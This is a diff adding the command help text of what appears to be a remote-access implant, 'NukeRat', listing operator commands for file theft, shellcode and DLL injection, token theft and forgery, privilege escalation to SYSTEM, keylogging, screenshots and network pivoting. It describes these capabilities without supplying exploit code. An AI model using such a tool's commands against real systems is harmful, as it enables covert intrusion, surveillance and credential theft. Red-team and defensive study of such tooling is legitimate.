@@ -1,0 +1,156 @@
+-------------------------------------------------------------------------------------------------------------------------
+GENERAL
+-------------------------------------------------------------------------------------------------------------------------
+
+    (Command)     (Usage)                                                  (Description)
+    
+    help          help                                                     Show this help message
+                  help arp                                                 Show command details and examples
+                  help -os [linux|mac]                                     Show OS compatible commands
+
+    config        config                                                   View implant configuration
+    delay         delay 4                                                  Set implant delay in seconds
+
+    kill          kill                                                     Terminate implant process (ExitProcess)
+
+    tasks         tasks                                                    Show running tasks IDs
+                  tasks kill 3912                                          Kill a running task by ID
+
+-------------------------------------------------------------------------------------------------------------------------
+FILESYSTEM
+-------------------------------------------------------------------------------------------------------------------------
+
+    pwd           pwd                                                      Show current directory
+    cd            cd /home/user                                            Change directory
+    ls            ls /etc                                                  List files and directories
+    cat           cat /etc/hosts                                           Display file contents
+    preview       preview file.txt --size-limit 4096                       Read first bytes of a file
+    fileinfo      fileinfo file.exe                                        File metadata (size, times, attributes)
+    acl           acl /some/path                                           DACL and owner for path
+
+    echo          echo hello world                                         Print text to output
+                  echo $PATH                                               View environment variable
+
+    cp            cp /tmp/a.txt /tmp/b.txt                                 Copy file
+    mv            mv /tmp/a /tmp/b                                         Move or rename file
+    rm            rm /tmp/a.txt                                             Delete file
+    ren           ren C:\Temp\old.txt C:\Temp\new.txt                      Rename file
+    mkdir         mkdir /tmp/newfolder                                     Create directory
+    rmdir         rmdir /tmp/newfolder                                     Remove directory
+    upload        upload -f file.exe -o C:/file.exe                        Upload a file to the target
+    download      download -f C:/file.exe -o file.exe                      Download a file from the target
+    reg           reg <mode> [..args]                                      Native Windows registry operations
+    search        search --path C:\Users --content password                Search file contents
+
+-------------------------------------------------------------------------------------------------------------------------
+RECOGNITION
+-------------------------------------------------------------------------------------------------------------------------
+
+    whoami        whoami                                                   Current user info
+    systeminfo    systeminfo                                               Detailed OS and hardware info
+    env           env                                                      List all environment variables
+    tasklist      tasklist ROOT\CIMV2                                      Running processes via WMI
+    enumdrives    enumdrives                                               List available drive letters
+    ifconfig      ifconfig                                                 Network adapter configuration
+    route         route                                                    Network routing table
+    arp           arp                                                      ARP cache table
+    netstat       netstat TCP                                              Active connections
+    hooks         hooks                                                    Compare export prologues (mem vs disk)
+
+-------------------------------------------------------------------------------------------------------------------------
+EXECUTION
+-------------------------------------------------------------------------------------------------------------------------
+
+    shell         shell whoami                                             Execute shell command
+    powershell    powershell ps aux                                        Execute PowerShell script
+    shellcode     shellcode -f file.bin                                    Execute raw shellcode
+    bof           bof -f file.o --- <args>                                 Execute built-in BOF
+    dotnet        dotnet -f file.exe --- <args>                            Execute .NET assembly
+    load-dll      load-dll -f file.dll                                     Load DLL into memory
+    load-so       load-so -f file.so                                       Load SO into memory
+    load-dylib    dylib -f file.dylib                                      Load DYLIB into memory
+
+-------------------------------------------------------------------------------------------------------------------------
+INJECTION
+-------------------------------------------------------------------------------------------------------------------------
+
+    migrate       migrate 4919 [--alloc <mode>]                        Inject implant shellcode into a process
+
+    spawn         spawn -t cmd.exe --- <args>                          Spawn process and capture output
+                  spawn suspend -t C:\Windows\System32\notepad.exe     Create suspended process (no resume)
+
+    inj           inj shellcode -f file.bin -p 2300 --- <args>         Inject shellcode into a process
+                  inj dll-reflective -f file.dll -p 2300               Inject reflective DLL into a process
+                  inj donut -f file -p 2300 --- <args>                 Inject multiple payloads types via donut
+
+    --alloc       --alloc section                                      Use section allocation
+                  --alloc stomping [--stomp-dll "name.dll"]            Use stomping allocation
+                  [!] Avaliable in inj and migrate 
+
+    --encoder     --encoder sgn                                        Use sgn encoder
+                  [!] inj donut/shellcode only
+
+-------------------------------------------------------------------------------------------------------------------------
+PROCESS
+-------------------------------------------------------------------------------------------------------------------------
+
+    proc          proc info                                                       Current process summary
+                  proc info [modules|privileges|full]                             Show specific process information
+                  proc info --pid <pid> privileges                                Privilege list for PID
+                  proc info --pid <pid>                                           Process summary for PID
+                  proc privileges --name SeDebugPrivilege -st [on|off]            Enable or disable a privilege
+                  proc [kill|suspend|resume] --pid <pid>                          Change process state by PID
+
+    tokens        tokens                                                          Current token
+                  tokens grab --pid 1000                                          Grab token from a process into vault
+                  tokens list                                                     List saved vault tokens
+                  tokens impersonate --id 0                                       Impersonate a vault token
+                  tokens remove --id 0 [--all]                                    Remove vault token
+                  tokens forge --domain name --user jhon --pass 123456            Create a forged logon session
+                  tokens revert                                                   Stop impersonating (RevertToSelf)
+
+    runas         runas --domain name -u jhon -p 123 --path cmd.exe --- <args>    Execute a command as a different user
+
+-------------------------------------------------------------------------------------------------------------------------
+PIVOTING
+-------------------------------------------------------------------------------------------------------------------------
+
+    relay         relay                                                                                Show relays
+                  relay create -c tcp -l 8888 -t [implant|server]://10.1.1.5:9090  [--tls]             Create TCP relay
+                  relay create -c smb -l 445 -t [implant|server]://10.1.1.5:9090 --pipe test [--tls]   Create SMB relay
+                  relay delete --id 445                                                                Remove relay by id
+
+    [!] The SOCKS5 and port forwarding options are available in the menu option: NukeRat > Network.
+
+-------------------------------------------------------------------------------------------------------------------------
+UTILITIES
+-------------------------------------------------------------------------------------------------------------------------
+
+    getsystem     getsystem --method [inject|token|com]                    Try to elevate to SYSTEM
+                  getsystem --method token --sacrifice C:\some\file.exe    Spawn host for token/COM inject
+
+    keylogger     keylogger [start|stop] --method [keystate|boardstate]    Start/Stop keylogger in background
+
+    screenshot    screenshot                                               Take a single screenshot
+                  screenshot [start|stop] --delay 15 (seconds)             Start/Stop screenshot loop
+
+-------------------------------------------------------------------------------------------------------------------------
+ARMORY & LOLBINS
+-------------------------------------------------------------------------------------------------------------------------
+
+    armory        armory                                                   Show all available armory tools
+                  armory [install|remove] seatbelt                         Install/Remove armory tools
+                  armory update                                            Update armory tools
+
+    lolbins       lolbins [<category>]                                     Show lolbins by category
+                  lolbins check <category>                                 Check if category binaries exist on the host
+
+-------------------------------------------------------------------------------------------------------------------------
+MODIFIERS 
+-------------------------------------------------------------------------------------------------------------------------
+
+    -bg           shell -bg dir                                            Run in background without waiting for output
+    -w / --wait   shell -w 30 ping 127.0.0.1 -n 10                         Set a custom maximum wait time (seconds)
+    prefix        prefix                                                   Show current command prefix
+                  prefix powershell                                        Set a sticky prefix prepended to every command
+                  prefix clear                                             Clear active prefix
